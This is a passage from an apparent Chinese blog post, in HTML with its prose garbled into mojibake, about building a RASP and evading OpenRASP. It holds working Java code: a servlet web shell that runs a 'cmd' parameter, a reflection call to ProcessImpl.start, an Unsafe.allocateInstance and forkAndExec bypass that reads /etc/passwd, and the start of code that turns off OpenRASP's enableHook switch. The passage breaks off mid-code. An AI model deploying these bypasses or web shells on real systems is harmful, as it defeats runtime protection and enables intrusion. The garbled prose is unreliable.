src="https://pic.imgdb.cn/item/64cfd7411ddac507cc867270.jpg" alt="image-20230806141750369"></a></p><p>ä¹‹åè¿è¡Œï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd74f1ddac507cc868ffb.jpg" title="image-20230806141939188" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd74f1ddac507cc868ffb.jpg" alt="image-20230806141939188"></a></p><p>æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ï¼Œæ‰§è¡Œåˆ°ProcessBuilderçš„startæ–¹æ³•åè¾“å‡ºGet Out!Hacker!å¹¶è¿”å›äº†ï¼Œå› æ­¤å¹¶æ²¡æœ‰æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚é‚£æˆ‘ä»¬æ¢ä¸€ç§æ–¹æ³•ï¼Œå› ä¸ºRuntime.getRuntime().exec()çš„åº•å±‚å°±æ˜¯è°ƒç”¨ProcessBuilderçš„startæ–¹æ³•ï¼Œé‚£æˆ‘ä»¬ç›´æ¥åˆ©ç”¨ProcessBuilderçš„startæ–¹æ³•æ‰§è¡Œå‘½ä»¤è¯•è¯•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">command</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>().command(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;mate-calc&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> command.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾ç„¶ç¬¦åˆé¢„æœŸï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd75a1ddac507cc86a5be.jpg" title="image-20230806142227583" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd75a1ddac507cc86a5be.jpg" alt="image-20230806142227583"></a></p><p>ä½†æ˜¯è¯·æ³¨æ„ï¼Œæˆ‘ä»¬åˆšåˆšæåˆ°äº†ï¼ŒRuntime.getRuntime().exec()æ‰§è¡Œå‘½ä»¤çš„åº•å±‚é€»è¾‘æ˜¯é€šè¿‡ProcessBuilderå»æ‰§è¡Œå‘½ä»¤çš„ï¼Œè€ŒProcessBuilderæ‰§è¡Œå‘½ä»¤å®é™…æ˜¯è°ƒç”¨äº†ProcessImplè¿™ä¸ªç±»ã€‚é‚£å‡å¦‚æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ProcessImplç±»çš„startæ–¹æ³•å»æ‰§è¡Œå‘½ä»¤ï¼Œæ˜¯ä¸æ˜¯å°±èƒ½ç»•è¿‡äº†ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;mate-calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="type">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">e</span> <span class="operator">=</span> (Process) method.invoke(<span class="literal">null</span>, cmds, <span class="literal">null</span>, <span class="string">&quot;.&quot;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸbypassï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7661ddac507cc86bfe0.jpg" title="image-20230806142428935" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7661ddac507cc86bfe0.jpg" alt="image-20230806142428935"></a></p><p><strong>ä»è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥å‘ç°ï¼Œå¦‚æœæˆ‘ä»¬è¦å†™ä¸€ä¸ªé’ˆå¯¹æŸç§æ¼æ´çš„RASPï¼Œå°±å¿…éœ€å°†è¿™ç§æ¼æ´çš„åº•å±‚åŸç†ææ¸…æ¥šã€‚å¦åˆ™å°±åƒä¸Šé¢æåˆ°çš„ä¾‹å­ï¼Œç»•è¿‡æ˜¯å¾ˆè½»æ¾çš„ã€‚</strong>è¿™ä¸€ç‚¹å°±ä¸WAFæœ‰å¾ˆå¤§å·®åˆ«ï¼ŒWAFå¯èƒ½åªéœ€è¦å¯¹ä¸€äº›å…³é”®å­—è¿›è¡Œè¿‡æ»¤å³å¯é˜²å¾¡æ”»å‡»ï¼Œä½†æ˜¯RASPå´ä¸è¡Œã€‚</p><p>æˆ‘ä»¬åˆšåˆšå†™è¿™ä¸ªDemo RASPçš„æ—¶å€™è¿˜é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯æˆ‘ä»¬è¿‡æ»¤çš„æ—¶å€™ç›´æ¥å°†æ‰€æœ‰çš„å‘½ä»¤éƒ½ç»™å±è”½äº†ã€‚å¯æ˜¯æˆ‘ä»¬å¾ˆå¤šæ—¶å€™åˆç¡®å®æœ‰æ‰§è¡Œå‘½ä»¤çš„éœ€æ±‚ï¼Œé‚£å¯¹äºè¿™ä¸€ç‚¹æˆ‘ä»¬è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿæˆ‘ä»¬å…ˆçœ‹çœ‹ä¸‡èƒ½çš„OpenRASPæ˜¯æ€ä¹ˆåšçš„ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7721ddac507cc86db09.jpg" title="image-20230806172951560" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7721ddac507cc86db09.jpg" alt="image-20230806172951560"></a></p><p>OpenRASPé€šè¿‡é»‘åå•çš„æ–¹å¼å¯¹éƒ¨åˆ†å‘½ä»¤è¿›è¡Œäº†æ­£åˆ™è¿‡æ»¤ï¼Œå¯æ˜¯å¾ˆæ˜æ˜¾ï¼Œè¿™æ ·åšä»ç„¶å¾ˆä¸å®‰å…¨ï¼Œæœ€å¤§åŸå› å°±æ˜¯é»‘åå•çš„å‘½ä»¤ä¸å¤Ÿå®Œå¤‡ï¼Œæ”»å‡»è€…å¾ˆè½»æ¾å°±å¯ä»¥ç»•è¿‡ã€‚è¿™é‡Œåˆå¼•å‡ºä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœç»§ç»­å®Œå–„é»‘åå•ï¼Œä¼šè€—è´¹å·¨å¤§çš„äººåŠ›ä¸è¯´ï¼Œè¿˜ä¼šä½¿å¾—åº”ç”¨çš„æ€§èƒ½ä¸¥é‡ä¸‹é™ã€‚é‚£å¦‚æœé‡‡ç”¨ç™½åå•å‘¢ï¼Ÿå¦‚æœæˆ‘ä»¬æƒ³æ‰§è¡Œä»€ä¹ˆå‘½ä»¤ï¼Œå°±å¯¹æ­¤å‘½ä»¤åŠ ç™½ï¼Œä¼¼ä¹åˆæ˜¾å¾—éå¸¸éº»çƒ¦ã€‚å› ä¸ºæœ¬äººæ°´å¹³æ‰€è‡´ï¼Œæ²¡æœ‰åŠæ³•ç»™å‡ºæ—¢èƒ½ä½¿å¾—æ€§èƒ½ä¸‹é™ä¸æ˜æ˜¾ï¼Œåˆèƒ½ä½¿é˜²å¾¡èƒ½åŠ›å¤§å¹…åº¦ä¸Šå‡çš„åšæ³•ã€‚ä¸è¿‡ç¬”è€…æ›´å€¾å‘ç™½åå•çš„æ–¹å¼å¯¹å‘½ä»¤è¿›è¡Œè¿‡æ»¤ã€‚</p><h2 id="Bypass-OpenRASP"><a href="#Bypass-OpenRASP" class="headerlink" title="Bypass OpenRASP"></a>Bypass OpenRASP</h2><h3 id="Unsafeç»•è¿‡"><a href="#Unsafeç»•è¿‡" class="headerlink" title="Unsafeç»•è¿‡"></a>Unsafeç»•è¿‡</h3><p>é¦–å…ˆè®¾ç½®44è¡Œçš„all_logä¸ºfalseï¼Œå³å…³é—­è§‚å¯Ÿæ¨¡å¼ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7801ddac507cc86f61d.jpg" title="image-20230806200227925" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7801ddac507cc86f61d.jpg" alt="image-20230806200227925"></a></p><p>ä¹‹åå°†å‘½ä»¤æ³¨å…¥æ¨¡å—çš„actionç”±logæ”¹ä¸ºblockï¼Œæ­¤æ—¶æˆ‘ä»¬å°±æ‰“å¼€äº†æ‹¦æˆªæ¨¡å¼ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7891ddac507cc870802.jpg" title="image-20230806200209175" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7891ddac507cc870802.jpg" alt="image-20230806200209175"></a></p><p>æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªHttpServletï¼Œå…¶ä¸­doGetæ–¹æ³•ä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> ((a=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">    byteArrayOutputStream.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">out.println(<span class="keyword">new</span> <span class="title class_">String</span>(byteArrayOutputStream.toByteArray()));</span><br></pre></td></tr></table></figure><p>ä¼ å…¥cmdå‚æ•°ä¸ºwhoamiï¼Œä»¥ä¸‹æ˜¯ç»“æœï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7961ddac507cc872447.jpg" title="image-20230806200633686" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7961ddac507cc872447.jpg" alt="image-20230806200633686"></a></p><p>ç¬¦åˆé¢„æœŸï¼ŒæŒ‰ç…§æ­£åˆ™è¡¨è¾¾å¼æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ã€‚ä¹‹åä¼ å…¥cmd&#x3D;cat &#x2F;etc&#x2F;passwdï¼Œç»“æœä¸ºï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7a11ddac507cc873e11.jpg" title="image-20230806200744779" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7a11ddac507cc873e11.jpg" alt="image-20230806200744779"></a></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•bypassã€‚åœ¨bypassä¹‹å‰ï¼Œæˆ‘ä»¬å†å›æƒ³ä¸€ä¸‹OpenRASPçš„hookæµç¨‹ï¼Ÿæ¯”å¦‚è¿™é‡Œæåˆ°çš„å‘½ä»¤æ‰§è¡Œéƒ¨åˆ†ï¼ŒOpenRASPåœ¨UNIXProcessæˆ–è€…ProcessImplç±»çš„åˆå§‹åŒ–æ–¹æ³•å¤„æ’å…¥äº†è‡ªå·±çš„é˜²å¾¡ä»£ç ï¼Œä½¿å¾—æˆ‘ä»¬æ— æ³•æ‰§è¡Œé»‘åå•ä¸­çš„å‘½ä»¤ã€‚é‚£éº»çƒ¦æ€è€ƒä¸€ä¸‹ï¼Œæ—¢ç„¶å®ƒåœ¨UNIXProcessæˆ–è€…ProcessImplç±»çš„åˆå§‹åŒ–æ–¹æ³•ä¸­æ’å…¥äº†é˜²å¾¡ä»£ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ‰æ²¡æœ‰ä¸€ç§åŠæ³•èƒ½å¤Ÿä¸éœ€è¦è°ƒç”¨è¿™ä¸¤ä¸ªç±»çš„åˆå§‹åŒ–æ–¹æ³•å°±èƒ½ç›´æ¥è·å–UNIXProcessæˆ–è€…ProcessImplç±»å‘¢ï¼Ÿå½“ç„¶æ˜¯æœ‰çš„ï¼Œåœ¨Javaä¸­æœ‰ä¸€ä¸ªå«Unsafeçš„ç±»ï¼Œå®ƒæä¾›äº†éå¸¸åº•å±‚çš„<code>å†…å­˜ã€CASã€çº¿ç¨‹è°ƒåº¦ã€ç±»ã€å¯¹è±¡</code>ç­‰æ“ä½œã€<code>Unsafe</code>æ­£å¦‚å®ƒçš„åå­—ä¸€æ ·å®ƒæä¾›çš„å‡ ä¹æ‰€æœ‰çš„æ–¹æ³•éƒ½æ˜¯ä¸å®‰å…¨çš„ã€‚è€ŒUnsafeç±»ä¸­æœ‰ä¸€ä¸ªallocateInstanceæ–¹æ³•ï¼Œå®ƒå¯ä»¥æ— è§†æ„é€ æ–¹æ³•ä»è€Œç›´æ¥åˆ›å»ºè¿™ä¸ªç±»çš„å®ä¾‹ã€‚æ¥ä¸‹æ¥ç»™å¤§å®¶åšä¸ªç¤ºèŒƒï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String[] commands = request.getParameterValues(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="comment">//åå°„è·å–unsafeå®ä¾‹</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å–UNIXProcesså®ä¾‹</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe.allocateInstance(processClass);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] args = <span class="keyword">new</span> <span class="title class_">byte</span>[commands.length - <span class="number">1</span>][];</span><br><span class="line">        <span class="type">int</span>      <span class="variable">size</span> <span class="operator">=</span> args.length; <span class="comment">// For added NUL bytes</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">            args[i] = commands[i + <span class="number">1</span>].getBytes();</span><br><span class="line">            size += args[i].length;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">        <span class="type">int</span>    <span class="variable">i</span>        <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span>[] arg : args) &#123;</span><br><span class="line">            System.arraycopy(arg, <span class="number">0</span>, argBlock, i, arg.length);</span><br><span class="line">            i += arg.length + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] envc                 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span>[] std_fds              = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">launchMechanismField</span> <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">helperpathField</span>      <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">        launchMechanismField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        helperpathField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">launchMechanismObject</span> <span class="operator">=</span> launchMechanismField.get(processObject);</span><br><span class="line">        <span class="type">byte</span>[] helperpathObject      = (<span class="type">byte</span>[]) helperpathField.get(processObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> (<span class="type">int</span>) launchMechanismObject.getClass().getMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">forkMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class,</span><br><span class="line">                <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        forkMethod.setAccessible(<span class="literal">true</span>);<span class="comment">// è®¾ç½®è®¿é—®æƒé™</span></span><br><span class="line">        <span class="type">byte</span>[] CString = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(commands[<span class="number">0</span>] == <span class="literal">null</span>)&#123;</span><br><span class="line">            CString = <span class="literal">null</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes  = commands[<span class="number">0</span>].getBytes();</span><br><span class="line">            CString = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length + <span class="number">1</span>];</span><br><span class="line">            System.arraycopy(bytes, <span class="number">0</span>, CString, <span class="number">0</span>, bytes.length);</span><br><span class="line">            CString[CString.length - <span class="number">1</span>] = (<span class="type">byte</span>) <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pid</span> <span class="operator">=</span> (<span class="type">int</span>) forkMethod.invoke(processObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                ordinal + <span class="number">1</span>, helperpathObject, CString, argBlock, args.length,</span><br><span class="line">                <span class="literal">null</span>, envc[<span class="number">0</span>], <span class="literal">null</span>, std_fds, <span class="literal">false</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆå§‹åŒ–å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå°†æœ¬åœ°å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºæµè½¬æ¢ä¸ºç¨‹åºæ‰§è¡Œç»“æœçš„è¾“å‡ºæµ</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">initStreamsMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;initStreams&quot;</span>, <span class="type">int</span>[].class);</span><br><span class="line">        initStreamsMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        initStreamsMethod.invoke(processObject, std_fds);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æœ¬åœ°æ‰§è¡Œç»“æœçš„è¾“å…¥æµ</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getInputStreamMethod</span> <span class="operator">=</span> processClass.getMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">        getInputStreamMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span>                   <span class="variable">a</span>    <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[]                b    = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(baos.toString());</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬å†ä¼ å…¥?cmd&#x3D;cat&amp;cmd&#x3D;&#x2F;etc&#x2F;passwdï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7af1ddac507cc875daf.jpg" title="image-20230806201152184" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7af1ddac507cc875daf.jpg" alt="image-20230806201152184"></a></p><p>å¯¹ä»£ç éƒ¨åˆ†ç®€ç•¥è§£é‡Šä¸€ä¸‹å§ã€‚é¦–å…ˆæˆ‘ä»¬é€šè¿‡åå°„è·å–ä¸€ä¸ªunsafeå®ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åå°„è·å–unsafeå®ä¾‹</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>ä¹‹ååˆè·å–äº†UNIXProcesså®ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe.allocateInstance(processClass);</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬åˆ›å»ºæ­¤UNIXProcesså¯¹è±¡æ—¶å¹¶æœª é€šè¿‡å…¶æ„é€ å‡½æ•°æ¥è·å–ï¼Œå› æ­¤å¹¶æœªæ‰§è¡ŒOpenRASPçš„hookä»£ç ï¼Œä»è€Œå®Œæˆç»•è¿‡ï¼</p><h3 id="å…³é—­OpenRASPå¼€å…³"><a href="#å…³é—­OpenRASPå¼€å…³" class="headerlink" title="å…³é—­OpenRASPå¼€å…³"></a>å…³é—­OpenRASPå¼€å…³</h3><p>åœ¨ä¸€èˆ¬çš„RASPäº§å“ä¸­ä¸ºäº†é¿å…å½±å“äº§å“ï¼Œéƒ½ä¼šè®¾ç½®ä¸€ä¸ªå¼€å…³ï¼Œåœ¨OpenRASPä¸­ä¹Ÿä¸ä¾‹å¤–ã€‚OpenRASPçš„å¼€å…³å°±æ˜¯com.baidu.openrasp.HookHandlerçš„enableHookå­—æ®µï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7be1ddac507cc877c57.jpg" title="image-20230807002521102" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7be1ddac507cc877c57.jpg" alt="image-20230807002521102"></a></p><p>åœ¨æˆ‘ä»¬åˆšåˆšåˆ†æçš„hookæµç¨‹ä¸­ï¼Œæœ‰ä¸€ä¸ªcom.baidu.openrasp.HookHandler#doRealCheckWithoutRequestå‡½æ•°ï¼Œåœ¨å‡½æ•°å¼€å§‹åšäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå°±æ˜¯åˆ¤æ–­OpenRASPçš„å¼€å…³æ˜¯å¦æ‰“å¼€ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7ca1ddac507cc8793c4.jpg" title="image-20230807002548473" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7ca1ddac507cc8793c4.jpg" alt="image-20230807002548473"></a></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„å°†è¿™ä¸ªå­—æ®µè®¾ä¸º<code>new AtomicBoolean(false)</code>ï¼Œå³å…³é—­è¿™ä¸ªå­—æ®µï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 